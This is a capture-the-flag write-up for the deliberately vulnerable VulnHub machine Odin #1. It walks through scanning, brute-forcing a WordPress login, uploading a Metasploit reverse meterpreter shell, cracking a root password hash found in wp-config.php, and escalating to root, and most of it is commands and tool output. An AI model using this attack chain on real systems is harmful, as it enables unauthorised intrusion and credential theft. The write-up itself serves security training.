
# Odin #1 - CTF

Available on VulnHub: https://www.vulnhub.com/entry/odin-1,619/


## IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.181   08:00:27:98:83:4d      1      60  PCS Systemtechnik GmbH                                            
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## Port Scanning

```
$ nmap -AT4 -p- 192.168.1.181
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-19 17:55 -03
Nmap scan report for 192.168.1.181
Host is up (0.00026s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.5.3
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: vikingarmy &#8211; Just another Joomla site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.63 seconds
```

## HTML Source Analysis

The page source has references for `http://odin/`. So I created a entry for my DNS hosts mapping target IP address.
```
$ cat /etc/hosts

127.0.0.1       localhost
127.0.1.1       Kali-Burton
192.168.1.181   odin
```

The page has some encoded content. Lets decode it:
```
$ echo "NB2HI4DTHIXS6Z3JORUHKYROMNXW2L3EMFXGSZLMNVUWK43TNRSXEL2TMVRUY2LTORZS6YTMN5RC63LBON2GK4RPKBQXG43XN5ZGI4ZPJRSWC23FMQWUIYLUMFRGC43FOMXXE33DNN4W65JOOR4HILTUMFZC4Z32EBZG6Y3LPFXXKIDONFRWKIDXN5ZGI3DJON2AU===" | base32 -d
https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz rockyou nice wordlist
```

```
$ echo "SWYgeW91IGxvb2sgY2xvc2VseSwgeW91IHdvbid0IG5lZWQgaXQgaGVyZQo=" | base64 -d
If you look closely, you won't need it here
```

## Web Analysis

```
$ dirb http://192.168.1.181

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Dec 19 18:23:12 2020
URL_BASE: http://192.168.1.181/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.181/ ----
+ http://192.168.1.181/index.php (CODE:301|SIZE:0)                                                                   
==> DIRECTORY: http://192.168.1.181/javascript/                                                                      
+ http://192.168.1.181/phpmyadmin (CODE:403|SIZE:278)                                                                
+ http://192.168.1.181/server-status (CODE:403|SIZE:278)                                                             
==> DIRECTORY: http://192.168.1.181/wp-admin/                                                                        
==> DIRECTORY: http://192.168.1.181/wp-content/                                                                      
==> DIRECTORY: http://192.168.1.181/wp-includes/                                                                     
+ http://192.168.1.181/xmlrpc.php (CODE:405|SIZE:42)                                                                 
                                                                                                                     
---- Entering directory: http://192.168.1.181/javascript/ ----
==> DIRECTORY: http://192.168.1.181/javascript/jquery/                                                               
                                                                                                                     
---- Entering directory: http://192.168.1.181/wp-admin/ ----
+ http://192.168.1.181/wp-admin/admin.php (CODE:302|SIZE:0)                                                          
==> DIRECTORY: http://192.168.1.181/wp-admin/css/                                                                    
==> DIRECTORY: http://192.168.1.181/wp-admin/images/                                                                 
==> DIRECTORY: http://192.168.1.181/wp-admin/includes/                                                               
+ http://192.168.1.181/wp-admin/index.php (CODE:302|SIZE:0)                                                          
==> DIRECTORY: http://192.168.1.181/wp-admin/js/                                                                     
==> DIRECTORY: http://192.168.1.181/wp-admin/maint/                                                                  
==> DIRECTORY: http://192.168.1.181/wp-admin/network/                                                                
==> DIRECTORY: http://192.168.1.181/wp-admin/user/                                                                   
                                                                                                                     
---- Entering directory: http://192.168.1.181/wp-content/ ----
+ http://192.168.1.181/wp-content/index.php (CODE:200|SIZE:0)                                                        
==> DIRECTORY: http://192.168.1.181/wp-content/languages/                                                            
==> DIRECTORY: http://192.168.1.181/wp-content/plugins/                                                              
==> DIRECTORY: http://192.168.1.181/wp-content/themes/                                                               
==> DIRECTORY: http://192.168.1.181/wp-content/upgrade/                                                              
==> DIRECTORY: http://192.168.1.181/wp-content/uploads/                                                              
                                                                                                                     
---- Entering directory: http://192.168.1.181/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.181/javascript/jquery/ ----
+ http://192.168.1.181/javascript/jquery/jquery (CODE:200|SIZE:271809)                                               
                                                                                                                     
---- Entering directory: http://192.168.1.181/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.181/wp-admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.181/wp-admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.181/wp-admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.181/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.181/wp-admin/network/ ----
+ http://192.168.1.181/wp-admin/network/admin.php (CODE:302|SIZE:0)                                                  
+ http://192.168.1.181/wp-admin/network/index.php (CODE:302|SIZE:0)                                                  
                                                                                                                     
---- Entering directory: http://192.168.1.181/wp-admin/user/ ----
+ http://192.168.1.181/wp-admin/user/admin.php (CODE:302|SIZE:0)                                                     
+ http://192.168.1.181/wp-admin/user/index.php (CODE:302|SIZE:0)                                                     
                                                                                                                     
---- Entering directory: http://192.168.1.181/wp-content/languages/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.181/wp-content/plugins/ ----
+ http://192.168.1.181/wp-content/plugins/index.php (CODE:200|SIZE:0)                                                
                                                                                                                     
---- Entering directory: http://192.168.1.181/wp-content/themes/ ----
+ http://192.168.1.181/wp-content/themes/index.php (CODE:200|SIZE:0)                                                 
                                                                                                                     
---- Entering directory: http://192.168.1.181/wp-content/upgrade/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.181/wp-content/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sat Dec 19 18:23:27 2020
DOWNLOADED: 41508 - FOUND: 14
```

```
$ nikto -h http://192.168.1.181

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.181
+ Target Hostname:    192.168.1.181
+ Target Port:        80
+ Start Time:         2020-12-19 18:23:23 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'link' found, with contents: <http://odin/index.php?rest_route=/>; rel="https://api.w.org/"
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'x-redirect-by' found, with contents: WordPress
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /: A Wordpress installation was found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login.php?action=register: Wordpress registration enabled
+ OSVDB-3268: /wp-content/uploads/: Directory indexing found.
+ /wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information
+ /wp-login.php: Wordpress login found
+ 7915 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2020-12-19 18:25:15 (GMT-3) (112 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```
$ gobuster dir -u http://192.168.1.181 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x .php,.txt,.js,/,.html

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.181
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,txt,js,/
[+] Timeout:        10s
===============================================================
2020/12/19 18:23:41 Starting gobuster
===============================================================
/index.php (Status: 301)
/phpmyadmin (Status: 403)
/license.txt (Status: 200)
/wp-content (Status: 301)
/wp-admin (Status: 301)
/readme.html (Status: 200)
/wp-trackback.php (Status: 200)
/wp-login.php (Status: 200)
===============================================================
2020/12/19 18:25:04 Finished
===============================================================
```

## WordPress Analysis

```
$ wpscan -e ap,at,u --url http://192.168.1.181
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.11
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://192.168.1.181/ [192.168.1.181]
[+] Started: Sat Dec 19 18:27:40 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.1.181/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] Registration is enabled: http://192.168.1.181/wp-login.php?action=register
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.1.181/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.1.181/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.3 identified (Latest, released on 2020-10-30).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.1.181/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.5.3'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.1.181/, Match: 'WordPress 5.5.3'

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <========================================> (10 / 10) 100.00% Time: 00:00:00

[i] No Users Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Dec 19 18:27:41 2020
[+] Requests Done: 68
[+] Cached Requests: 11
[+] Data Sent: 14.447 KB
[+] Data Received: 16.094 MB
[+] Memory used: 121.562 MB
[+] Elapsed time: 00:00:01
```

## WordPress Login Brute Forcing

I attempt to crack WordPress login with `wpscan`.
```
$ cat users.txt 
admin
odin

$ wpscan --url http://192.168.1.181/ -U users.txt -P /usr/share/wordlists/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.11
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.1.181/ [192.168.1.181]
[+] Started: Sat Dec 19 18:30:47 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.1.181/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] Registration is enabled: http://192.168.1.181/wp-login.php?action=register
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.1.181/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.1.181/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.3 identified (Latest, released on 2020-10-30).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.1.181/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.5.3'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.1.181/, Match: 'WordPress 5.5.3'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=========================================> (22 / 22) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 2 user/s
[SUCCESS] - admin / qwerty                                                                                            
^Cying odin / israel Time: 00:00:16 <                                         > (852 / 28688804)  0.00%  ETA: ??:??:??
[!] Valid Combinations Found:
 | Username: admin, Password: qwerty

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Dec 19 18:31:13 2020
[+] Requests Done: 881
[+] Cached Requests: 28
[+] Data Sent: 453.649 KB
[+] Data Received: 524.408 KB
[+] Memory used: 181.766 MB
[+] Elapsed time: 00:00:25

Scan Aborted: Canceled by User
```

User: **admin**\
Pass: **qwerty**

## Exploitation

```
$ msfconsole

msf6 > use exploit/unix/webapp/wp_admin_shell_upload

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password qwerty
password => qwerty
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts 192.168.1.181
rhosts => 192.168.1.181
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username admin
username => admin
msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   qwerty           yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.1.181    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME   admin            yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.189    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress


msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit

[*] Started reverse TCP handler on 192.168.1.189:4444 
[*] Authenticating with WordPress using admin:qwerty...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/sVvkpBRBVH/FBafKaYbDY.php...
[*] Sending stage (39282 bytes) to 192.168.1.181
[*] Meterpreter session 1 opened (192.168.1.189:4444 -> 192.168.1.181:40366) at 2020-12-19 18:37:29 -0300
[+] Deleted FBafKaYbDY.php
[+] Deleted sVvkpBRBVH.php
[+] Deleted ../sVvkpBRBVH

meterpreter > sysinfo
Computer    : osboxes
OS          : Linux osboxes 5.4.0-26-generic #30-Ubuntu SMP Mon Apr 20 16:58:30 UTC 2020 x86_64
Meterpreter : php/linux
```

## System Users

```
meterpreter > shell
Process 1733 created.
Channel 1 created.

python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@osboxes:$ 

www-data@osboxes:/$ ls -lah /home
total 16K
drwxr-xr-x  4 root    root    4.0K Dec  4 15:54 .
drwxr-xr-x 23 root    root    4.0K Jul  5 22:43 ..
drwxrw---- 15 osboxes osboxes 4.0K Dec  5 10:05 osboxes
drwxr-xr-x  4 rockyou rockyou 4.0K Dec  4 15:58 rockyou

www-data@osboxes:/$ cat /home/rockyou/ok
Get out of here!
```

## WordPress Config

```
www-data@osboxes:/$ cat /var/www/html/wp-config.php

<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'joomla' );

/** MySQL database username */
define( 'DB_USER', 'joomla' );

/** MySQL database password */
define( 'DB_PASSWORD', 'joomla' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'hJ6K`1Lh|p>fc/)&[~yFq~fyW|aIt/aN(t4D{f4q/j.R6[|CNgW{Jgz(,w+L#[3D' );
define( 'SECURE_AUTH_KEY',  '$NY`wt7VU18-FcJC/|~c*NKy*EJ,]:6jS_ShC20hpZnUhV%+0.=-=PaM_5%shx%f' );
define( 'LOGGED_IN_KEY',    'A6R.i/vfrs*.i-e[(Elb*hD}S bV;<%bjd,!${8PRhDl+a0}X:9Y4% 6CJ,]tazm' );
define( 'NONCE_KEY',        '7B01IEuF=J}ep]`k*oy]{/*L)2O=U5LVJR+YioC?|!~KGdv-b/_ |VmHF[hC: un' );
define( 'AUTH_SALT',        '7#xk&!&`({X!1nF#jkWiXu$s7<{]vrl_n:n.R!9qy%@l1rDglP&HpB)G{bPdz>mV' );
define( 'SECURE_AUTH_SALT', '$KC6{ex+{<*Q:%T:U.`=YHg>`f!:fmFb@%twt2_z=P((gdUY@HgG5Mq4=q-5e$vg' );
define( 'LOGGED_IN_SALT',   '6gs|sWkYAZ@?&8NkX:u< F=v^sCcd/CJ#YiI-H*^ OC/SBC6XBh?cRYN(;J3_?3=' );
define( 'NONCE_SALT',       'xA+mKYMD;]J@>tEi%MT1!<$|<5KBs1AX@C8E|y2WAE=NwR5{3:piVlWHr6JsK[6u' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

/** root:$6$e9hWlnuTuxApq8h6$ClVqvF9MJa424dmU96Hcm6cvevBGP1OaHbWg//71DVUF1kt7ROW160rv9oaL7uKbDr2qIGsSxMmocdudQzjb01:18600:0:99999:7:::*/
```

Root user hash found:
```
root:$6$e9hWlnuTuxApq8h6$ClVqvF9MJa424dmU96Hcm6cvevBGP1OaHbWg//71DVUF1kt7ROW160rv9oaL7uKbDr2qIGsSxMmocdudQzjb01:18600:0:99999:7:::
```

## Cracking Root Hash

```
$ cat root.hash
root:$6$e9hWlnuTuxApq8h6$ClVqvF9MJa424dmU96Hcm6cvevBGP1OaHbWg//71DVUF1kt7ROW160rv9oaL7uKbDr2qIGsSxMmocdudQzjb01:18600:0:99999:7:::

$ john -wordlist=/usr/share/wordlists/rockyou.txt root.hash 

Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
jasmine          (root)
1g 0:00:00:00 DONE (2020-12-19 19:02) 9.090g/s 6981p/s 6981c/s 6981C/s 123456..james1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

User: **root**\
Pass: **jasmine**

## Privilege Escalation

```
www-data@osboxes:/$ su root
Password: jasmine

root@osboxes:/# id
uid=0(root) gid=0(root) groups=0(root)
```

## Root Flag

```
root@osboxes:~# cat /root/bjorn

cσηgяαтυℓαтιση
Have a nice day!
aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1WaGtmblBWUXlhWQo=
```

```
$ echo "aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1WaGtmblBWUXlhWQo=" | base64 -d
https://www.youtube.com/watch?v=VhkfnPVQyaY
```
